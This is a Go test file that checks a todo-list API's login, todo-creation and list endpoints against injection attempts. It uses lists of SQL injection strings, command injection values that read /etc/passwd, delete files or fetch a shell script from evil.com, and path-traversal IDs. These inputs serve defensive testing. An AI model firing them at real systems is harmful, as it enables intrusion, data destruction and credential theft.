package security_test

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"

	"todolist-api/internal/models"
	"todolist-api/internal/testutil"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestSQLInjectionInLogin tests SQL injection attempts in login endpoint
func TestSQLInjectionInLogin(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping security test in short mode")
	}

	router, cleanup := SetupTestRouter(t)
	defer cleanup()

	// Common SQL injection payloads
	sqlInjectionVectors := []string{
		"' OR '1'='1",
		"' OR '1'='1' --",
		"' OR '1'='1' /*",
		"admin'--",
		"admin' #",
		"admin'/*",
		"' OR 1=1--",
		"' UNION SELECT NULL--",
		"'; DROP TABLE users--",
		"1' AND '1'='1",
		"' OR 'a'='a",
		"') OR ('1'='1",
	}

	for _, vector := range sqlInjectionVectors {
		t.Run(vector, func(t *testing.T) {
			loginReq := models.LoginRequest{
				Email:    vector,
				Password: vector,
			}

			body, err := json.Marshal(loginReq)
			require.NoError(t, err)

			req, err := http.NewRequest("POST", "/api/v1/auth/login", bytes.NewBuffer(body))
			require.NoError(t, err)
			req.Header.Set("Content-Type", "application/json")

			w := httptest.NewRecorder()
			router.ServeHTTP(w, req)

			// Should not succeed with SQL injection
			assert.NotEqual(t, http.StatusOK, w.Code, "SQL injection vector should not succeed: %s", vector)

			// Should return proper error, not expose SQL errors
			if w.Code >= 400 {
				var response map[string]interface{}
				err := json.Unmarshal(w.Body.Bytes(), &response)
				require.NoError(t, err)

				// Should not expose internal SQL errors
				if errorMsg, ok := response["error"].(string); ok {
					assert.NotContains(t, errorMsg, "SQL", "Should not expose SQL errors")
					assert.NotContains(t, errorMsg, "database", "Should not expose database errors")
					assert.NotContains(t, errorMsg, "query", "Should not expose query errors")
				}
			}
		})
	}
}

// TestSQLInjectionInTodoDescription tests SQL injection in todo descriptions
func TestSQLInjectionInTodoDescription(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping security test in short mode")
	}

	router, cleanup := SetupTestRouter(t)
	defer cleanup()

	// Register and login to get a token
	user, token := CreateTestUserWithToken(t, router)
	list := testutil.CreateTestListViaAPI(t, router, token, user.ID)

	sqlInjectionVectors := []string{
		"'; DROP TABLE todos--",
		"' OR '1'='1",
		"' UNION SELECT * FROM users--",
	}

	for _, vector := range sqlInjectionVectors {
		t.Run(vector, func(t *testing.T) {
			todoReq := models.CreateTodoRequest{
				Description: vector,
				Priority:    models.PriorityMedium,
			}

			body, err := json.Marshal(todoReq)
			require.NoError(t, err)

			req, err := http.NewRequest("POST", "/api/v1/lists/"+list.ID.String()+"/todos", bytes.NewBuffer(body))
			require.NoError(t, err)
			req.Header.Set("Content-Type", "application/json")
			req.Header.Set("Authorization", "Bearer "+token)

			w := httptest.NewRecorder()
			router.ServeHTTP(w, req)

			// Should either succeed (storing the text safely) or fail gracefully
			if w.Code == http.StatusCreated {
				var todo models.Todo
				err := json.Unmarshal(w.Body.Bytes(), &todo)
				require.NoError(t, err)

				// The description should be stored as-is (escaped properly by GORM)
				assert.Equal(t, vector, todo.Description, "Description should be stored safely")
			} else {
				// If it fails, should not expose SQL errors
				var response map[string]interface{}
				err := json.Unmarshal(w.Body.Bytes(), &response)
				require.NoError(t, err)

				if errorMsg, ok := response["error"].(string); ok {
					assert.NotContains(t, errorMsg, "SQL", "Should not expose SQL errors")
				}
			}
		})
	}
}

// TestCommandInjectionInDescription tests command injection attempts
func TestCommandInjectionInDescription(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping security test in short mode")
	}

	router, cleanup := SetupTestRouter(t)
	defer cleanup()

	user, token := CreateTestUserWithToken(t, router)
	list := testutil.CreateTestListViaAPI(t, router, token, user.ID)

	commandInjectionVectors := []string{
		"; ls -la",
		"| cat /etc/passwd",
		"& whoami",
		"`rm -rf /`",
		"$(curl evil.com)",
		"; wget http://evil.com/shell.sh",
	}

	for _, vector := range commandInjectionVectors {
		t.Run(vector, func(t *testing.T) {
			todoReq := models.CreateTodoRequest{
				Description: "Test " + vector,
				Priority:    models.PriorityMedium,
			}

			body, err := json.Marshal(todoReq)
			require.NoError(t, err)

			req, err := http.NewRequest("POST", "/api/v1/lists/"+list.ID.String()+"/todos", bytes.NewBuffer(body))
			require.NoError(t, err)
			req.Header.Set("Content-Type", "application/json")
			req.Header.Set("Authorization", "Bearer "+token)

			w := httptest.NewRecorder()
			router.ServeHTTP(w, req)

			// Should succeed (command injection doesn't apply to Go API) but store safely
			if w.Code == http.StatusCreated {
				var todo models.Todo
				err := json.Unmarshal(w.Body.Bytes(), &todo)
				require.NoError(t, err)

				// Command should be stored as text, not executed
				assert.Contains(t, todo.Description, vector)
			}
		})
	}
}

// TestNoSQLInjectionInUUID tests that UUID validation prevents injection
func TestNoSQLInjectionInUUID(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping security test in short mode")
	}

	router, cleanup := SetupTestRouter(t)
	defer cleanup()

	_, token := CreateTestUserWithToken(t, router)

	// Malicious UUID-like strings
	maliciousUUIDs := []string{
		"' OR '1'='1",
		"00000000-0000-0000-0000-000000000000' OR '1'='1",
		"123; DROP TABLE todos--",
		"../../../etc/passwd",
	}

	for _, maliciousID := range maliciousUUIDs {
		t.Run(maliciousID, func(t *testing.T) {
			req, err := http.NewRequest("GET", "/api/v1/lists/"+maliciousID, nil)
			require.NoError(t, err)
			req.Header.Set("Authorization", "Bearer "+token)

			w := httptest.NewRecorder()
			router.ServeHTTP(w, req)

			// Should reject with 400 Bad Request for invalid UUID
			assert.Equal(t, http.StatusBadRequest, w.Code, "Should reject invalid UUID: %s", maliciousID)

			var response map[string]interface{}
			err = json.Unmarshal(w.Body.Bytes(), &response)
			require.NoError(t, err)

			// Should return validation error
			assert.Contains(t, response, "error")
		})
	}
}
